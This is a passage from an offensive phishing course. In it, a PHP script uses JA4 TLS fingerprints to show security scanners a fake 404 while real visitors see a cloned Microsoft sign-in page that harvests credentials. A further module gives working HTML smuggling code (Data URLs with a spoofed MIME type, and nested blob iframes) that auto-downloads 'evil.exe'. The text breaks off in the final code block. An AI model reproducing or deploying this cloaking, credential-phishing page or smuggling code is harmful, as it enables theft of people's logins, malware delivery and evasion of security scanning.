// Unique ja4_c fingerprints
"bb25da17b02d"
"e6dcd7ae0a9e"

```

### Low Count Fingerprints
Besides unique fingerprints, a fingerprint appearing only a few times can also be suspicious. Again, this is mainly because legitimate browsers tend to have widely shared JA4 fingerprints due to standardized TLS configurations, while bots and custom clients often generate uncommon fingerprints.

In our case, we found two fingerprints with counts of 1 and 5, which are confirmed to be bots.

```
"85036bcba153"
"9dc949149365"

```

### Fingerprint and User Agent Consistency
A final step in analysis is verifying whether the `ja4_b` and `ja4_c` fingerprints align with the declared user agent. If the fingerprint does not match the expected characteristics of the user agent, it may indicate spoofing or automation.

Both `ja4_b` and `ja4_c` can be used together for a stricter check, or a single value can be used for a more relaxed approach. This allows flexibility depending on how aggressively bots should be filtered.

For example, if we assume that all Chrome versions using TCP (excluding QUIC) have a `ja4_b` value of `8daaf6152771`, any client with a different value can be immediately flagged as a bot.

## Conclusion
In this module, we collected and analyzed JA4 scanner and bot telemetry to identify detection patterns. In the next module, we will use these patterns to develop an anti-bot script that analyzes JA4 fingerprints in-depth.

## Objectives
Setup HAProxy and the PHP logging script and scan your website using various online scanners

Find abnormalities in the logged JA4_a fingerprints


---

# Novo Módulo 3 — Anti-Bot Via Análise JA4 Avançada

Novo Módulo 3 — Anti-Bot Via Análise JA4 Avançada

- # Novo Módulo 3 — Anti-Bot Via Análise JA4 Avançada

# Disclaimer
# Module 3 - Anti-Bot Via Advanced JA4 Analysis

## Introduction
In the previous module, we collected JA4 fingerprints associated with scanners and analyzed them to identify suspicious indicators. In this module, we will implement anti-bot measures by using these indicators to detect and block bots from accessing the phishing website.Similarly to the previous module, we will need HAProxy setup and configured to send the backend phishing server the JA4 fingerprint. Review the JA4 Analysis: Calculating JA4 Fingerprints module if you require a refresher.
## Implementation Overview
The implementation of the anti-bot mechanism will block clients that meet any of the following criteria:
The `ja4_a` fingerprint does not include an ALPN.

- The `ja4_a` fingerprint indicates a TLS version other than 1.3.

- The `ja4_a` fingerprint uses TLS 1.3, but the ALPN is HTTP/1.1.

- The `ja4_a` fingerprint indicates more than 30 or fewer than 5 ciphers. You can adjust these thresholds for a stricter or more lenient approach.

- The `ja4_b` or `ja4_c` are unique fingerprints in the JA4 database.

- The `ja4_b` or `ja4_c` appear fewer than 5 times in the JA4 database. You can adjust the threshold for a stricter or more lenient approach.

## Creating JA4 Databases
Prior to building our backend script, we will create two databases from the `ja4db.json`. The databases will be saved as `ja4_b.txt` and `ja4_c.txt` with each containing a list of known `ja4_b` and `ja4_c` fingerprints extracted from the full `ja4_fingerprint` field, respectively.

Start by downloading the `ja4db.json` file using the command below.

```
curl -L https://ja4db.com/api/download/ -o ja4db.json

```
Next, use `jq` to extract the `ja4_b` and `ja4_c` fingerprints and save them to their respective files. The files will be saved in the `/var/www` directory, outside the document root.

```
# Create ja4_b.txt
jq -r '.[] | select(.ja4_fingerprint) | .ja4_fingerprint | split("_")[1]' ja4db.json > /var/www/ja4_b.txt

# Create ja4_c.txt
jq -r '.[] | select(.ja4_fingerprint) | .ja4_fingerprint | split("_")[2]' ja4db.json > /var/www/ja4_c.txt

```

## Backend Implementation
The backend implementation starts with the extraction of the `X-JA4-Fingerprint` and parsing it into the three sections: `ja4_a`, `ja4_b`, and `ja4_c`. The `parseJA4` function takes the JA4 fingerprint and splits it based on underscores, returning each section in an array. The extracted sections are then assigned to individual variables `$ja4a`, `$ja4b`, and `$ja4c` to allow for specific checks on each fingerprint component.

```
// Helper function to parse the JA4 fingerprint
function parseJA4(string $fingerprint): array {
    $parts = explode('_', $fingerprint);
    if (count($parts) !== 3) {
        return [];
    }
    return [
        'ja4a' => $parts[0],
        'ja4b' => $parts[1],
        'ja4c' => $parts[2]
    ];
}

$fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'] ?? null;
if ($fingerprint === null || $fingerprint === '') {
    exit;
}

// Debug value
echo "JA4: " . $fingerprint . "<br>";

// Parse & extract ja4 sections
$parsed = parseJA4($fingerprint);
$ja4a = $parsed['ja4a'];
$ja4b = $parsed['ja4b'];
$ja4c = $parsed['ja4c'];

// Debug values
echo "JA4_A: $ja4a<br>";
echo "JA4_B: $ja4b<br>";
echo "JA4_C: $ja4c<br>";

```
Next, we create the function `countFingerprintMatch` to count how many times a given fingerprint appears in a given database file. The `countFingerprintMatch` function takes two parameters:

- `$filePath` - The path to the database file that will be searched.

- `$fingerprint` - The fingerprint that will be searched for in the `$filePath`.

We invoke the function twice to obtain the number of matches for the `$ja4b` and `$ja4c` fingerprints in their respective database files and store them in `$ja4b_count` and `$ja4c_count`, respectively.

```
function countFingerprintMatch(string $filePath, string $fingerprint): int {
    $handle = fopen($filePath, 'r');
    if (!$handle) return 0;

    $count = 0;
    while (($line = fgets($handle)) !== false) {
        if (trim($line) === $fingerprint) {
            $count++;
        }
    }

    fclose($handle);
    return $count;
}

$ja4b_count = countFingerprintMatch('/var/www/ja4_b.txt', $ja4b);
$ja4c_count = countFingerprintMatch('/var/www/ja4_c.txt', $ja4c);

// Debug Values
echo "JA4_B Count: $ja4b_count<br>";
echo "JA4_C Count: $ja4c_count<br>";

```
We also extract the ALPN from the final two bytes, the TLS version from the second and third bytes, and the cipher suite count from two bytes starting at the fifth position of the `ja4a` string.

```
// Extract ALPN, TLS version and Cipher suites
$alpn = substr($ja4a, -2);
$tlsVersion = (int)substr($ja4a, 1, 2);
$cipherCount = (int)substr($ja4a, 4, 2);

// Debug Values
echo "ALPN: $alpn<br>";
echo "TLS Version: $tlsVersion<br>";
echo "Cipher Count: $cipherCount<br>";

```
Additionally, we will create a logging function, `logClient`, which records the client's IP address, the reason for flagging, whether the client was blocked, and the timestamp of the event.

```
function logClient(string $reason, bool $blocked = true): void {
    $logEntry = [
        "ip" => $_SERVER["HTTP_X_FORWARDED_FOR"] ?? 'unknown',
        "blocked" => $blocked,
        "reason" => $reason,
        "timestamp" => date("c")
    ];

    $file = "/var/www/clients.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}

```
Finally, we will implement our previously explained bot detection rules by checking the ALPN, TLS version, cipher suite count, and validate the count for the `ja4_b` and `ja4_c` fingerprints to determine if the client exhibits suspicious characteristics. Currently, the detection rules only log potential bot activity without taking any action. Blocking will be introduced later, after confirming the accuracy of these rules in identifying bots.

```
$botDetected = false;

if ($alpn === '00') {
    logClient("Client has an unspecified ALPN");
    $botDetected = true;
}

if ($tlsVersion !== 13) {
    logClient("Client is not using TLS 1.3");
    $botDetected = true;
}

if ($tlsVersion === 13 && $alpn === 'h1') {
    logClient("Client is using TLS 1.3 and HTTP/1.1");
    $botDetected = true;
}

if ($cipherCount < 5 || $cipherCount > 30) {
    logClient("Client has an unusual cipher count");
    $botDetected = true;
}

if ($ja4b_count === 0) {
    logClient("Client has a unique ja4_b");
    $botDetected = true;
}

if ($ja4c_count === 0) {
    logClient("Client has a unique ja4_c");
    $botDetected = true;
}

if ($ja4b_count > 0 && $ja4b_count < 5) {
    logClient("Client has a low count of ja4_b");
    $botDetected = true;
}

if ($ja4c_count > 0 && $ja4c_count < 5) {
    logClient("Client has a low count of ja4_c");
    $botDetected = true;
}

if (!$botDetected) {
    logClient("No bot characteristics found", false);
}

```

### Complete Code
The complete code for the backend logic is shown below.

```
<?php

// Helper function to parse the JA4 fingerprint
function parseJA4(string $fingerprint): array {
    $parts = explode('_', $fingerprint);
    if (count($parts) !== 3) {
        return [];
    }
    return [
        'ja4a' => $parts[0],
        'ja4b' => $parts[1],
        'ja4c' => $parts[2]
    ];
}

$fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'] ?? null;
if ($fingerprint === null || $fingerprint === '') {
    exit;
}

// Debug value
echo "JA4: " . $fingerprint . "<br>";

// Parse & extract ja4 sections
$parsed = parseJA4($fingerprint);
$ja4a = $parsed['ja4a'];
$ja4b = $parsed['ja4b'];
$ja4c = $parsed['ja4c'];

// Debug values
echo "JA4_A: $ja4a<br>";
echo "JA4_B: $ja4b<br>";
echo "JA4_C: $ja4c<br>";

function countFingerprintMatch(string $filePath, string $needle): int {
    $handle = fopen($filePath, 'r');
    if (!$handle) return 0;

    $count = 0;
    while (($line = fgets($handle)) !== false) {
        if (trim($line) === $needle) {
            $count++;
        }
    }

    fclose($handle);
    return $count;
}

$ja4b_count = countFingerprintMatch('/var/www/ja4_b.txt', $ja4b);
$ja4c_count = countFingerprintMatch('/var/www/ja4_c.txt', $ja4c);

// Debug Values
echo "JA4_B Count: $ja4b_count<br>";
echo "JA4_C Count: $ja4c_count<br>";

// Extract ALPN, TLS version and Cipher suites
$alpn = substr($ja4a, -2);
$tlsVersion = (int)substr($ja4a, 1, 2);
$cipherCount = (int)substr($ja4a, 4, 2);

// Debug Values
echo "ALPN: $alpn<br>";
echo "TLS Version: $tlsVersion<br>";
echo "Cipher Count: $cipherCount<br>";

function logClient(string $reason, bool $blocked = true): void {
    $logEntry = [
        "ip" => $_SERVER["HTTP_X_FORWARDED_FOR"] ?? 'unknown',
        "blocked" => $blocked,
        "reason" => $reason,
        "timestamp" => date("c")
    ];

    $file = "/var/www/clients.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}

$botDetected = false;

if ($alpn === '00') {
    logClient("Client has an unspecified ALPN");
    $botDetected = true;
}

if ($tlsVersion !== 13) {
    logClient("Client is not using TLS 1.3");
    $botDetected = true;
}

if ($tlsVersion === 13 && $alpn === 'h1') {
    logClient("Client is using TLS 1.3 and HTTP/1.1");
    $botDetected = true;
}

if ($cipherCount < 5 || $cipherCount > 30) {
    logClient("Client has an unusual cipher count");
    $botDetected = true;
}

if ($ja4b_count === 0) {
    logClient("Client has a unique ja4_b");
    $botDetected = true;
}

if ($ja4c_count === 0) {
    logClient("Client has a unique ja4_c");
    $botDetected = true;
}

if ($ja4b_count > 0 && $ja4b_count < 5) {
    logClient("Client has a low count of ja4_b");
    $botDetected = true;
}

if ($ja4c_count > 0 && $ja4c_count < 5) {
    logClient("Client has a low count of ja4_c");
    $botDetected = true;
}

if (!$botDetected) {
    logClient("No bot characteristics found", false);
}

?>

```

## Handling False Positives
Testing the backend blocking implementation reveals that some rules are problematic, leading to false positives and incorrectly flagging legitimate clients. The main issues stem from the rules related to detecting unique or low counts of `ja4_b` and `ja4_c`. While these checks have potential for identifying bots, the reliability of the decision heavily depends on the quality and coverage of the data used. The databases built from `ja4db.json` are currently too limited or incomplete to serve as a definitive source for this type of detection, resulting in unintended blocking of real users.

To address these issues, we would need to collect analytics from legitimate clients and build our own custom fingerprint databases. However, for the scope of this module, we will simply disregard and remove the affected rules to avoid false positives.

```
// Problematic rules

if ($ja4b_count === 0) {
    logClient("Client has a unique ja4_b");
    $botDetected = true;
}

if ($ja4c_count === 0) {
    logClient("Client has a unique ja4_c");
    $botDetected = true;
}

if ($ja4b_count > 0 && $ja4b_count < 5) {
    logClient("Client has a low count of ja4_b");
    $botDetected = true;
}

if ($ja4c_count > 0 && $ja4c_count < 5) {
    logClient("Client has a low count of ja4_c");
    $botDetected = true;
}

```
The updated code without the problematic rules is shown below.

```
<?php

// Helper function to parse the JA4 fingerprint
function parseJA4(string $fingerprint): array {
    $parts = explode('_', $fingerprint);
    if (count($parts) !== 3) {
        return [];
    }
    return [
        'ja4a' => $parts[0],
        'ja4b' => $parts[1],
        'ja4c' => $parts[2]
    ];
}

$fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'] ?? null;
if ($fingerprint === null || $fingerprint === '') {
    exit;
}

// Debug value
echo "JA4: " . $fingerprint . "<br>";

// Parse & extract ja4 sections
$parsed = parseJA4($fingerprint);
$ja4a = $parsed['ja4a'];
$ja4b = $parsed['ja4b'];
$ja4c = $parsed['ja4c'];

// Debug values
echo "JA4_A: $ja4a<br>";
echo "JA4_B: $ja4b<br>";
echo "JA4_C: $ja4c<br>";

// Extract ALPN, TLS version and Cipher suites
$alpn = substr($ja4a, -2);
$tlsVersion = (int)substr($ja4a, 1, 2);
$cipherCount = (int)substr($ja4a, 4, 2);

// Debug Values
echo "ALPN: $alpn<br>";
echo "TLS Version: $tlsVersion<br>";
echo "Cipher Count: $cipherCount<br>";

function logClient(string $reason, bool $blocked = true): void {
    $logEntry = [
        "ip" => $_SERVER["HTTP_X_FORWARDED_FOR"] ?? 'unknown',
        "blocked" => $blocked,
        "reason" => $reason,
        "timestamp" => date("c")
    ];

    $file = "/var/www/clients.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}

$botDetected = false;

if ($alpn === '00') {
    logClient("Client has an unspecified ALPN");
    $botDetected = true;
}

if ($tlsVersion !== 13) {
    logClient("Client is not using TLS 1.3");
    $botDetected = true;
}

if ($tlsVersion === 13 && $alpn === 'h1') {
    logClient("Client is using TLS 1.3 and HTTP/1.1");
    $botDetected = true;
}

if ($cipherCount < 5 || $cipherCount > 30) {
    logClient("Client has an unusual cipher count");
    $botDetected = true;
}

if (!$botDetected) {
    logClient("No bot characteristics found", false);
}

?>

```

## Results
Use various online tools such as VirusTotal, Cloudflare Scanner, and URLScan.io to scan the website and collect traffic analytics. Once enough data has been gathered, determine how many clients were blocked by running the following command:

```
jq '[.[] | select(.blocked == true)] | length' /var/www/clients.json

# Output: 39

```
To find the number of clients that were not blocked, use:

```
jq '[.[] | select(.blocked == false)] | length' /var/www/clients.json

# Output: 13

```
We can also extract the specific reasons why clients were blocked with:

```
jq -r '.[].reason' /var/www/clients.json | sort

```

```
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unspecified ALPN
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client has an unusual cipher count
Client is not using TLS 1.3
Client is not using TLS 1.3
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
Client is using TLS 1.3 and HTTP/1.1
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found
No bot characteristics found

```
With our current dataset, 75% of automated traffic was successfully blocked.

## Displaying Phishing Content
After verifying that the detection rules work successfully and have minimal false positives, we will update our backend implementation to display the phishing content to legitimate users. We also created the function `blockClient` which returns a `HTTP 404` to blocked clients. And finally, all debug values have been commented out.

```
<?php

// Helper function to parse the JA4 fingerprint
function parseJA4(string $fingerprint): array {
    $parts = explode('_', $fingerprint);
    if (count($parts) !== 3) {
        return [];
    }
    return [
        'ja4a' => $parts[0],
        'ja4b' => $parts[1],
        'ja4c' => $parts[2]
    ];
}

$fingerprint = $_SERVER['HTTP_X_JA4_FINGERPRINT'] ?? null;
if ($fingerprint === null || $fingerprint === '') {
    exit;
}

// Debug value
// echo "JA4: " . $fingerprint . "<br>";

// Parse & extract ja4 sections
$parsed = parseJA4($fingerprint);
$ja4a = $parsed['ja4a'];
$ja4b = $parsed['ja4b'];
$ja4c = $parsed['ja4c'];

// Debug values
// echo "JA4_A: $ja4a<br>";
// echo "JA4_B: $ja4b<br>";
// echo "JA4_C: $ja4c<br>";

// Extract ALPN, TLS version and Cipher suites
$alpn = substr($ja4a, -2);
$tlsVersion = (int)substr($ja4a, 1, 2);
$cipherCount = (int)substr($ja4a, 4, 2);

// Debug Values
// echo "ALPN: $alpn<br>";
// echo "TLS Version: $tlsVersion<br>";
// echo "Cipher Count: $cipherCount<br>";

function logClient(string $reason, bool $blocked = true): void {
    $logEntry = [
        "ip" => $_SERVER["HTTP_X_FORWARDED_FOR"] ?? 'unknown',
        "blocked" => $blocked,
        "reason" => $reason,
        "timestamp" => date("c")
    ];

    $file = "/var/www/clients.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}

function blockClient(): void {
    header("HTTP/1.1 404 Not Found");
    echo <<<HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>404 Not Found</title>
        <style>
            body {
                background-color: #f9f9f9;
                font-family: Arial, sans-serif;
                text-align: center;
                padding-top: 100px;
            }
            h1 {
                font-size: 80px;
                margin-bottom: 10px;
            }
            p {
                font-size: 24px;
                color: #000000;
            }
        </style>
    </head>
    <body>
        <h1>404</h1>
        <p>Page not found</p>
    </body>
    </html>
    HTML;
    exit;
}

// Detection rules
if ($alpn === '00') {
    logClient("Client has an unspecified ALPN");
    blockClient();
}

if ($tlsVersion !== 13) {
    logClient("Client is not using TLS 1.3");
    blockClient();
}

if ($tlsVersion === 13 && $alpn === 'h1') {
    logClient("Client is using TLS 1.3 and HTTP/1.1");
    blockClient();
}

if ($cipherCount < 5 || $cipherCount > 30) {
    logClient("Client has an unusual cipher count");
    blockClient();
}

// Not a bot
logClient("No bot characteristics found", false);

echo <<<PHISHING_CONTENT
<html>
<head>
    <title>Sign in to Microsoft Online Services</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"/><meta http-equiv="Pragma" content="no-cache"/><meta http-equiv="Expires" content="-1"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="PageID" content="i5030.2.0"/><meta name="SiteID" content="10"/><meta name="ReqLC" content="1033"/><meta name="LocLC" content="1033"/><meta name="mswebdialog-newwindowurl" content="*"/>
    <link href="https://web.archive.org/web/20211124193620/https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/images/favicon_a.ico" rel="SHORTCUT ICON" />
    <link href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/css/login.ltr.css" rel="stylesheet" type="text/css" /><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.1.5.1.min.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/aad.login.js" type="text/javascript"></script><script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.easing.1.3.js" type="text/javascript"></script>
    <style type="text/css">body {
            display: none;
        }
    </style>
</head>
<body><script>
        if (self == top) {
            var body = $("body");
            body.css("display", "block");
        } else {
            top.location = self.location;
        }
    </script>
<div class="ie_legacy" id="background_branding_container" style="background: #FFFFFF"><img alt="Illustration for Microsoft Online Services" id="background_background_image" />
<div class="background_title_text" id="background_company_name_text"> </div>
</div>

<div class="overlay ie_legacy" id="background_page_overlay"> </div>

<div class="login_panel" id="login_no_script_panel">
<table class="login_panel_layout" style="height: 100%;">
    <tbody>
        <tr class="login_panel_layout_row" style="height: 100%;">
            <td id="login_panel_left"> </td>
            <td id="login_panel_center"> </td>
            <td id="login_panel_right"> </td>
        </tr>
    </tbody>
</table>
</div>

<div class="login_panel" id="login_panel">
<table class="login_panel_layout" style="height: 100%;">
    <tbody>
        <tr class="login_panel_layout_row" style="height: 100%;">
            <td id="login_panel_left"> </td>
            <td id="login_panel_center"><!--office365 logo--><script type="text/javascript">
                        $(document).ready(function() {

                            Constants.DEFAULT_LOGO = "https://web.archive.org/web/20201012165953/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/office365/logo.png";
                            Constants.DEFAULT_LOGO_ALT = "Sign in";
                            Constants.DEFAULT_ILLUSTRATION = "https://web.archive.org/web/20211125201800/https://secure.aadcdn.microsoftonline-p.com/aadbranding/1.0.1/aadlogin/Office365/illustration.jpg";
                            Constants.DEFAULT_BACKGROUND_COLOR = "#EB3C00";

                            Context.TenantBranding.workload_branding_enabled = true;
                            User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
                            User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
                            Context.TenantBranding.whr_key = "";
                            jQuery("img#logo_img").attr("src", "");
                            Context.use_instrumentation = true;
                            User.moveFooterToBottom("250px");
                        });
                    </script>
            <div class="login_inner_container">
            <div class="inner_container cred">
            <div class="login_workload_logo_container"> </div>

            <div class="login_cta_container normaltext">
            <div class="cta_message_text 1" id="login_cta_text">Sign in with your organizational account</div>
            </div>

            <ul class="login_cred_container">
                <li class="login_cred_field_container">
                <div class="login_textfield textfield" id="cred_userid_container"><span class="input_field textfield"><label class="no_display" for="UsernameForm">User account</label> </span>

                <div class="input_border">
                <form action="" autocomplete="off" method="POST" name="LoginForm"><br />
                <span class="input_field textfield"><input class="login_textfield textfield required email field normaltext" name="UsernameForm" placeholder="someone@example.com " tabindex="1" type="text" /><br />
                <br />
                <input aria-label="Password" class="login_textfield textfield required field normaltext" name="password" placeholder="Password" tabindex="2" type="password" /><br />
                <br />
                <br />
                <input class="button normaltext cred_sign_in_button refresh_domain_state" type="submit" value="Sign In" /> </span></form>
                </div>
                <span class="input_field textfield"> </span>

                <div class="login_textfield textfield" id="cred_password_container"><span class="input_field textfield"><span class="input_field textfield"><label class="no_display" for="PasswordForm">Password</label> </span></span>

                <div class="input_border"> </div>
                <span class="input_field textfield"><span class="input_field textfield"> </span> </span></div>
                <span class="input_field textfield"> </span>

                <div class="no_display" id="cred_hidden_inputs_container"><span class="input_field textfield"><input id="PPSX" name="PPSX" type="hidden" value="PassportRN" /> <input id="i0327" name="PPFT" type="hidden" value="A1F6YNWGa2YkRUNNhPfW3T8PcqsjHEeiQmp*m*wFwPyxag08*cPrW*SpZSnKeqiDJI*EUu8ceb42zjM89!r*ck!Q6kkHvZYoRPC53LwqFG6O6YCE5yI3mHRGLjK6BurKT332TUIqbZPBSJiw!cfoJN2PCje1NESa7hs4mIzcHNmkN7DO0RJOeoWX8r1DK*UBFpxFwOw$" /> </span></div>
                <span class="input_field textfield"> </span></div>
                </li>
                <li class="login_cred_options_container">
                <div class="subtext normaltext" id="cred_kmsi_container"><span class="input_field "><input id="cred_keep_me_signed_in_checkbox" name="persist" tabindex="10" type="checkbox" value="0" /> <label class="persist_text" for="cred_keep_me_signed_in_checkbox" id="keep_me_signed_in_label_text">Keep me signed in</label> </span></div>
                </li>
            </ul>
            </div>
            </div>
            </td>
        </tr>
    </tbody>
</table>
</div>
</body>
</html>
PHISHING_CONTENT;

?>

```

## Results
Legitimate clients will see the following login page:

Bot and scanners with suspicious JA4 fingerprints will see a `HTTP 404`.

## Objectives
Create a rule to verify consistency between the JA4_b fingerprint and the user agent of Chromium-based browsers

Add support to clients connecting using the QUIC protocol instead of TCP


---

# Novo Módulo 4 — Estratégias de HTML Smuggling

Novo Módulo 4 — Estratégias de HTML Smuggling

- # Novo Módulo 4 — Estratégias de HTML Smuggling

# Disclaimer
# Module 4 - HTML Smuggling Strategies

## Introduction
In Module 80 - HTML Smuggling we introduce the basic concept of how HTML smuggling works. Additionally, we improved the basic HTML smuggling template to become more evasive by obfuscating and encoding it. Although the improvements to the HTML smuggling template improved evasion against static analysis, the dynamic behavior remained the same.This module will go through different HTML smuggling strategies that avoid following the behavior of the original HTML smuggling template shown in Module 80.
## Data URLs
One of the simplest ways of implementing an alternative method of HTML smuggling is by utilizing Data URLs. Data URLs allow us to embed files inline in documents by encoding the file content directly within the URL itself, eliminating the need for external resources. Additionally, Data URLs are commonly used across legitimate websites, making it harder to flag when they are used for smuggling.Data URLs have the following format:
```
data:[<media-type>][;base64],<data>

```

`data:` - Data URLs always start with `data:`.

- `[<media-type>]` - A MIME type indicating the type of data.

- `[;base64]` - An optional `;base64` string, indicating that the `<data>` is Base64-encoded.

- `<data>` - The data of the embedded content.

A basic example of using Data URLs to smuggle a binary file is shown below. Note that browser security prevents users from browsing to Data URLs as they were at one point abused heavily for phishing. Therefore, the snippet below dynamically creates an `<a>` element, sets the `href` attribute to the Data URL, sets the `download` attribute to `evil.exe` and automatically clicks it, resulting in the file being downloaded.

```
<html>
    <body>
        <script>
        const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
        const fileDataUri = "data:application/octet-stream;base64," + base64Data;

        const a = document.createElement('a');
        a.href = fileDataUri;
        a.download = "evil.exe";
        document.body.appendChild(a);

        setTimeout(() => {
        a.click();
        }, 0);
        </script>
    </body>
</html>

```
Some security scanners may flag `application/octet-stream` since it indicates a binary file. However, since we're specifying the `download` attribute for the `<a>` element, the MIME type can be set to a benign type such as `image/png`. The `download` attribute forces the browser to download the content rather than attempt to render it.

Note: Firefox will modify the extension to match the MIME type.

```
<html>
    <body>
        <script>
        const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
        const fileDataUri = "data:image/png;base64," + base64Data;

        const a = document.createElement('a');
        a.href = fileDataUri;
        a.download = "evil.exe";
        document.body.appendChild(a);

        setTimeout(() => {
        a.click();
        }, 0);
        </script>
    </body>
</html>

```

## Embedding Blobs
In the basic HTML smuggling template used in the previous HTML smuggling module, when the user landed on our phishing page, the JavaScript on the page created a blob URL which smuggled the embedded payload. A different approach is to create an outer blob URL that contains an iframe pointing to an inner blob URL. The inner blob can then create or trigger the download of the payload when loaded, allowing the smuggling to occur through an additional layer of indirection.

The HTML code snippet below creates an outer blob containing an iframe that loads an inner blob, which automatically triggers the download of a binary file.

This snippet only works in Firefox, an updated snippet will be shown later that works in Chromium browsers.

```
<html>
    <body>
        <script>
        // Convert binary file to blob
        const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
        const byteCharacters = atob(base64Data);
        const byteLength = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
        byteLength[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteLength);

        // Create blob URL
        const fileBlob = new Blob([byteArray], { type: "application/octet-stream" });
        const fileBlobUrl = URL.createObjectURL(fileBlob);

        // Inner blob which performs the file download
        const innerBlobContent = `
        <html><body>
            <a id="downloadLink" href="${fileBlobUrl}" download="evil.exe"></a>
            <script>
            document.getElementById('downloadLink').click();
            <\/script>
        </body></html>
        `;
        const innerBlob = new Blob([innerBlobContent], { type: "text/html" });
        const innerBlobUrl = URL.createObjectURL(innerBlob);

        // The outter blob that contains an iframe with the inner blob
        const outerBlobContent = `<iframe src="${innerBlobUrl}" width="600" height="400"></iframe>`;
        const outerBlob = new Blob([outerBlobContent], { type: "text/html" });
        const outerBlobUrl = URL.createObjectURL(outerBlob);

        // Dynamically create a link with the outer blob URL
        const link = document.createElement("a");
        link.href = outerBlobUrl;
        link.style.display = "none";
        document.body.appendChild(link);
        
        // Wait until parsing is complete prior to simulating the link click
        setTimeout(() => {
            link.click();
        }, 0);
        </script>
    </body>
</html>

```
The video can be found in folder: `./videos/demo-1-smuggling-update.mov`

## Embedding Blobs Improved
If you attempt to use the previous embedded smuggling code snippet in a browser other than Firefox, such as Edge or Chrome, you will notice that the iframe displays an error and the download is not initiated. The reason is that navigating the main window to a blob URL causes the browser to destroy the original JavaScript memory context. As a result, any blob URLs created in that context, including those used inside the iframe, become invalid. Without access to the inner blob URL, the iframe fails to load, and the download cannot proceed.

In contrast, Firefox handles blob URLs differently. When navigating to a blob URL, Firefox preserves the original memory context that created the blob, allowing child blob URLs (such as those assigned to iframes) to remain accessible even after navigation. Because the blob URLs stay valid in Firefox, the iframe successfully loads the inner blob, and the download is initiated as intended.

One way to circumvent this in Chromium browsers is by dynamically setting the iframe’s `src` after the outer blob fully loads. This works because Chrome temporarily preserves JavaScript-created blob URLs during page load and only clears memory after the new document finishes loading. Therefore, setting the iframe source on `window.onload` ensures the inner blob remains accessible.

```
// Dynamically setting the iframe's src value
const outerBlobContent = `
<html><body>
    <iframe id="innerFrame" style="width:600px; height:400px;"></iframe>
    <script>
    window.onload = function() {
        document.getElementById('innerFrame').src = "${innerBlobUrl}";
    }
    <\/script>
</body></html>
`;

```
The updated embedded HTML smuggling code is shown below.

```
<body>
    <script>
    // Convert binary file to blob
    const base64Data = "TVqQAAMAAAA..."; // Base64 of the binary file
    const byteCharacters = atob(base64Data);
    const byteLength = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
    byteLength[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteLength);
    const fileBlob = new Blob([byteArray], { type: "application/octet-stream" });
    const fileBlobUrl = URL.createObjectURL(fileBlob);

    const innerBlobContent = `
    <html><body>
        <a id="downloadLink" href="${fileBlobUrl}" download="evil.exe"></a>
        <script>
        window.onload = function() {
            document.getElementById('downloadLink').click();
        }
        <\/script>
    </body></html>
    `;

    const innerBlob = new Blob([innerBlobContent], { type: "text/html" });
    const innerBlobUrl = URL.createObjectURL(innerBlob);

    const outerBlobContent = `
    <html><body>
        <iframe id="innerFrame" style="width:600px; height:400px;"></iframe>
        <script>
        window.onload = function() {
            document.getElementById('innerFrame').src = "${innerBlobUrl}";
        }
        <\/script>
    </body></html>
    `;
    const outerBlob = new Blob([outerBlobContent], { type: "text/html" });
    const outerBlobUrl = URL.createObjectURL(outerBlob);

    const link = document.createElement("a");
    link.href = outerBlobUrl;
